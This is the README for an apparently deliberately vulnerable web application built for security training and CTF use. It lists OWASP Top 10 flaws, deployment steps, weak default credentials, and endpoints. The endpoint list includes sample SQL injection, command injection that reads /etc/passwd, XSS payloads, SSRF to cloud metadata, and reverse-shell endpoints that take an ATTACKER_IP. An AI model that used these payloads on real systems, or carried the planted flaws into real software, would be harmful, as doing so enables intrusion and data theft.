# ⚠️ VULNERABLE OWASP APPLICATION

**THIS APPLICATION CONTAINS INTENTIONAL SECURITY VULNERABILITIES**

## 🚨 WARNING

- **NEVER** deploy this application in production
- **NEVER** expose this application to the internet
- **ONLY** use for security testing, CTF challenges, and educational purposes

## 📋 Vulnerabilities Included

### OWASP Top 10 (2021)

| Category | Vulnerabilities |
|----------|----------------|
| A01:2021 - Broken Access Control | IDOR, Weak Auth, Cookie Bypass |
| A02:2021 - Cryptographic Failures | Plaintext Passwords, Exposed Secrets |
| A03:2021 - Injection | SQL, Command, LDAP, XPath, NoSQL |
| A04:2021 - Insecure Design | Predictable Tokens, Weak Questions |
| A05:2021 - Security Misconfiguration | Exposed Config, Stack Traces |
| A06:2021 - Vulnerable Components | Prototype Pollution, Insecure Deserialization |
| A07:2021 - Auth Failures | Session Fixation, Brute Force |
| A08:2021 - Integrity Failures | No Integrity Checks, Insecure CI/CD |
| A09:2021 - Logging Failures | Log Injection, Sensitive Logs |
| A10:2021 - SSRF | Webhook SSRF, PDF SSRF |

### Additional Vulnerabilities

- **XSS**: Reflected, Stored, DOM-based
- **CSRF**: No CSRF protection
- **Path Traversal**: File read/access
- **Open Redirect**: URL redirection
- **File Upload**: No validation
- **XXE**: XML External Entity
- **CORS**: Misconfiguration
- **JWT**: Weak implementation (alg: none)
- **RCE**: Web Shell, Command Execution
- **Reverse Shell**: Multiple payloads

## 🚀 Quick Start

### With Docker Compose

```bash
docker-compose up -d
```

Access: http://localhost:3000

### With Dokploy

1. Push to git repository
2. Create new application in Dokploy
3. Select "Docker Compose" deployment
4. Set repository URL
5. Deploy

## 📚 API Endpoints

### Authentication
- `POST /login` - Login (weak auth)
- `POST /register` - Register (plaintext passwords)
- `POST /auth` - Auth with SQLi

### SQL Injection
- `GET /users?name=admin' OR '1'='1` - SQLi
- `POST /auth` - Login bypass via SQLi

### Command Injection
- `GET /ping?host=127.0.0.1;id` - CMDi
- `GET /dns?domain=google.com;cat /etc/passwd` - CMDi
- `GET /cmd?exec=id` - Direct command execution

### XSS
- `GET /search-xss?q=<script>alert(1)</script>` - Reflected
- `POST /comments` - Stored XSS
- `GET /dom-xss#<img src=x onerror=alert(1)>` - DOM XSS

### RCE / Web Shell
- `POST /webshell` - `{"cmd":"id"}`
- `GET /shell?ip=ATTACKER_IP&port=4444` - Reverse shell payloads
- `GET /reverse-shell?listener=IP:PORT` - Multiple payloads

### SSRF
- `GET /fetch?url=http://169.254.169.254` - AWS metadata
- `GET /proxy?target=http://localhost:5432` - Internal services
- `POST /webhook` - Webhook SSRF

### Info Disclosure
- `GET /config` - All configuration
- `GET /debug` - Environment variables
- `GET /source` - Source code
- `GET /vulns` - All vulnerabilities list

## 🔐 Default Credentials

| Username | Password | Role |
|----------|----------|------|
| admin | admin123 | admin |
| user | password123 | user |
| guest | guest | guest |
| root | toor | admin |

## 🛠️ Database

PostgreSQL 18 Alpine with pre-populated vulnerable data:

- `users` - User credentials (plaintext passwords)
- `comments` - XSS payload storage
- `products` - NoSQL injection target
- `secrets` - Sensitive data

## 📝 License

Educational use only. Use responsibly.
